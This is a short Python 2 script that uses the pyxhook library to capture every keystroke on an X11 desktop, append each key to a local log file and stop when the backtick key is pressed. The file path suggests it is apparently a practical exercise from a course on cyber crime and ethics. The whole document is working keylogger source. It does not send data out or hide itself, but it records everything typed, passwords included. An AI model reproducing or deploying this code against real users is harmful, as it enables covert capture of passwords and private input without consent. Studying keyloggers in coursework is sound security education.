import pyxhook

log_file = '/media/naresh/c89be25d-fd96-4c9d-bae6-b3d7eed2a174/pg/sem1/crime_ethics/PRACT/keyl/key.log'


def OnKeyPress(event):
	fob = open(log_file,'a')
	fob.write(event.Key)
	fob.write('\n')
	print event.Key
	if event.Ascii==96:
		fob.close()
		new_hook.cancel()


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
